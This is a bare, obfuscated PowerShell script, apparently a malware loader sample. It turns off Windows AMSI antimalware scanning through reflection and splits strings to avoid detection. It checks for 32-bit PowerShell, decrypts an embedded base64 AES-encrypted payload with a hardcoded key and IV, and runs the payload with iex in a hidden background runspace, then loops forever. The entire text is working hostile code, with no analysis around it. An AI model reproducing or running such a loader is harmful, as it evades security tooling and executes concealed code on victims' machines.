$qvfyxui = {
function vbqiuydiny($zlpzghgxedzvmhgc, $sjpknmnzzxcizfowtjo, $fcpnfsibxxtxzlsfhrd) {
    $oqyyayshtq=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
    $oqyyayshtq.Mode="CBC";
    $oqyyayshtq.Padding = "Zeros";
    $oqyyayshtq.BlockSize = 128;
    $oqyyayshtq.KeySize = 256;
    $oqyyayshtq.IV = $sjpknmnzzxcizfowtjo;
    $oqyyayshtq.Key = $zlpzghgxedzvmhgc;
    $ojgftohxosbxfyg=$oqyyayshtq.CreateDecryptor();
    $oqgurklvocgrqcb=$ojgftohxosbxfyg.TransformFinalBlock($fcpnfsibxxtxzlsfhrd, 0, $fcpnfsibxxtxzlsfhrd.Length);
    return [System.Text.Encoding]::UTF8.GetString($oqgurklvocgrqcb).Trim([char]0)
}

$dwtugeayovmjwpkyfqy = 
"MFZjZnQ2L3ZaZzBtalFhYzEyZldUUDY2WlBRc3lJSVJqVTJ4M3JZbXNEM3hHK3ZKb0dXVU5ETURoWU9GVEJuT281VHNDTjMwUFpXZUQvQUdjTWkrbWJUK2ZFQXVabEd2MERFa1BiMWxzRDVvNmZ2Mm5nbCs5bEJDT3lwakxWelBSYzM1TE5LWXNWSUMrdkVWQzlzWWx3dlRlVVNjSjB2bHFVeCtldGpwNG5NR2ZEK21Tc1VORENYVzlYN25QNGlOWGU4UXVkSVMvTDlQR3BkUHE3RFprNWExc2hyb0xpMUg2cG1WTHJDamVuZndzWitjWDgvQ2Fxa2dhUDAyZEVNOFNnN1Q4Z1RvVkRrdTJPM2d6R1hYbURWbHdsdjk5WXpWSFd6WElINTlwdWZFN0dHWU9lZGpyL0tSeDR2SmRGa04xcXk4SDhreWovcXZxVGZlK01FUXhQcWtPT0VrV0dSRjRqVEp2ZEtKazErRGVDSndJYU9oVU9COUo5RERkOXFSR1ppb0NWS01GWUJrZ2dReU81bVlaNm9Ba1V5Z3RyNEZ4U0hncm1TcmVNaGpxbDEzYmppSlNES0ZWUHdNaW1qZXZGZ05Hc3FGSnM1ZFF3ZEVWYTBucjJseURHdGZFVWh3M09GS3MvVTY2RGEreHRPL3JLSFFscUNJRFhsVzdRK3h5Mnc2eVZwTllidzhTYnM1VXlzZTlyQ1pFQ0VMSWlscHA2QmNqSXd3VVp0V2hzaDlhbEN1b0Jxekp1ZksreU5TanJaaDZ0Y1FSZlRJR0dBM1dUcHAwcmN6Yy8wU2tqYlJUR2ZDd0tXa1B1M1NXMjNRek85L2ZtQXJjTkhLZFJUVlZOVVpFSlNoS1dnVFBZS1ArUDNKSlRUZlRQR21FZzdCT3FaMDJ1UFN1RE1WbGtkTHFia3IzK2J1UmpEQ2lwM1Rnc015aXc5MVNteDd1UHFNN2FlNEM4T3ZyRW5HZm1BaElpNm5heHVqeTR3ZWQyNzhnSWdacWl4MUJ1UHg4ZlArVHN5bFFQYytBTW94K1g2RXJtdXA1bmZmZWI5ZGVYM21RODJQd2k5YWlQcXpPaDYyaEFYWG81YVNOQ05tcEp0cmFCOUNZaFU3RW8zN3FvL2FmMjUzdDhaUGVjT011STVpMHcwZ0lacGJMd3lXYThmYk16TXd2cER4aXJvdFZSWktMY25LWU13aURTdUgzbTJFeWpieFBDSENWdnZGamRaNmQ2ZUVYV3NHQjhHa01YWk5YNW81SnJJTm84ZjdWZzYyNmVJd0d6K2dvVDc4WUpYNmxyanZ3Nko4eVR1MVVvaGZVeitGNEdkeDhXemNtMHEzVERkdFpRbWMyOTdka0ZVNHlmY0JBa2tLK2Exc1JnWWxTVDIwZUEyNU4wUEFrMjdWYUFjMHhUdWFsQnBISjVWUFMxdnF4N0E2SWc3d3ExRjR4Ky9sdlU5YWxHMzdHaWlrOUNpZnlvNWx4NlRhaVUrWjd1OGhQNzFOeFAzOTc0dVgvN1N0UkhLaGh1QVhDS3hVUlg5bUYra1dCR2c5STArM1pUR3UrTzNnUmljT0VuZWh0Vm5Zc3YyZFFOUm0wVFU5akNKQUtqWHJuUXJ2OHg0dGhhYUxDeWkzWCtZM2lNTnFxVUEzcEZzZUJGMXVnWmlNTVREZDVFZ1hUczVkcGFOWDdlYnA2ZlZoQkl1ZzRZazVFT3dCNmpMSWpFY210eXkzRU9DQm5CMkl0RE1uZW4veHJGeWY2ZWdMSjl6b25seXE2NmhKRHoxb0RKeENiUDhxc3d6Znc3emhQYk5tcXBUZm0xRFNUdXkzZHo4RXJIQ3BKeVp1QVg5QnRPSmJVSHIwb0FJekpCQkxYb1lMWS8yZ0lJY3U0RURnaVFvSUNXZTRGdk41L0E3RDE4THg0eGkwaG0wRWsrdE5qUWlJdjVUMS9CNTkwZEVSdHp4UUhGUHVrdWF3aGRtaytydm1TOXZFSEVxa1E5RlpMQTNMemdBTUZaV2g5bmpRMWJLSERXMjlSdjZtZ3k4Zkd0UDQ1bXcrdnJRb1FzdlROY2w0OGg0Sk0vRUMxUjYySlhBQVRPemtkaVc5SnBEV1IzeUU5eE4zQUJzMGNMR2w0bk1sYUVYSFNvQ0JyMEJaVFZ3VzB3Y1Y5NU8zcnkwVnBmV1kxMkRNbmlUeFAwOFlwelNVNEkzL052Q0ZXblNXaWlCNzhwS3NaakxPT2dndWhiNW9uVG1YdHVRalZSUHRYU25hK2tpTmRnMG53M1BGTTJNU3lycE1hSkFkM2dXV0w5Qy8yRklhZnVJNnRHUkZSd2FJU3VLQUlLNXZJMU9SWkVZdENuWVVYR3loWDgrV093RTJ4bEZhRmNmN201L0krZnJQdDBPQ1VWUXhQMEhra3VqRFNTcmZaSE51M0lqNmFGUlhRT0dFMVVTRjk5a3BWbE5qblMyRGJ0S3UycWtBem5SYUlXaXhtTklVdTkvMXZpdXcrU0p1emo4NGRuLzVRM3dmZllyUG9iMnczRkVvVmJSeG8zVmROdWVKUXhJeGZCZm1mbFNSeVk4TXhjcGNTOFluU3FtV2tjalBsZEhFbGo3TVhOQWE1WUp2TUxrcmg4WGo3M0V0NjVJL0hWR3F6N0ZYRk1qeDFFOG9SekVhYXdJZHArVEorb1VZWUUwTWx1OTdEVERPSWRCVE5zZlp3S0Q3MXM5em8xWVBHdG4yUlZJRGErQ2JwRFdhcDhCMjk1eXNXUWRyWkg5blRITitQVUttT2ZPQ0NNMTB3cHhheXJCZkVyMzZocDdpZnlOYXZ0eUEvdHEwWHdQeGJCRm0vSUFvdUk1VEQ3cHRCeUFCVHJJR1VvZkhNbzhqZ29MNEI0V2F1VWtieEhVQW1Ta0xVYzdhdk5Tei9idlpzc0NoQXZ6d3RXSGVOajNvMlE9PQ==";

$dwtugeayovmjwpkyfqy = [System.Convert]::FromBase64String($dwtugeayovmjwpkyfqy);
$sjpknmnzzxcizfowtjo = "nBNgcQqN408u/YsCrTyVcA==";
$sjpknmnzzxcizfowtjo = [System.Convert]::FromBase64String($sjpknmnzzxcizfowtjo);
$zlpzghgxedzvmhgc = "tpV6xqv5R60WhuQe4gJlhyJ7iM7fwckNKdfa4noguCI="
$zlpzghgxedzvmhgc = [System.Convert]::FromBase64String($zlpzghgxedzvmhgc);
$oqgurklvocgrqcb = vbqiuydiny $zlpzghgxedzvmhgc $sjpknmnzzxcizfowtjo $dwtugeayovmjwpkyfqy;
iex $oqgurklvocgrqcb;
}

[Scriptblock]$hnyhsylgfrvesqusqbn = {
    try{
        [ref].Assembly.GetType('System.Management.Automation.Amsi' + 'Utils').GetField('amsi'+'InitFailed', 'NonPublic,Static').SetValue($null, $true)
    }catch{}
}

if ([IntPtr]::Size -ne 4)
{
    throw 'You ar'+'e running x64 ve'+'rsion of powershe'+'ll. Run x32 v'+'ersion to make it wor'+'k'
    exit
}

$qttwsjp = [runspacefactory]::CreateRunspace()
$qttwsjp.ApartmentState = "STA"
$qttwsjp.ThreadOptions = "ReuseThread"
$qttwsjp.Open()
$vmeip = [PowerShell]::Create()
$vmeip.Runspace = $qttwsjp
$vmeip.AddScript($hnyhsylgfrvesqusqbn) | out-null
$vmeip.BeginInvoke() | out-null

Start-Sleep -s 5

function ztnkydjh{
    $jsmkx = ((Get-Variable MyInvocation -Scope 1).Value).MyCommand.Path
    if (-NOT($jsmkx)){
      $jsmkx = $PSCommandPath
    }
    return $jsmkx
}
$jsmkx = ztnkydjh

$bwxsfkaushhpwstwern =[runspacefactory]::CreateRunspace()
$bwxsfkaushhpwstwern.ApartmentState = "STA"
$bwxsfkaushhpwstwern.ThreadOptions = "ReuseThread"
$bwxsfkaushhpwstwern.Open()
$fywanzmfwvlyuchzvr = [PowerShell]::Create()
$fywanzmfwvlyuchzvr.Runspace = $bwxsfkaushhpwstwern
$fywanzmfwvlyuchzvr.AddScript($qvfyxui) | out-null
$fywanzmfwvlyuchzvr.BeginInvoke() | out-null

while($true){
    Start-Sleep -s 120
}

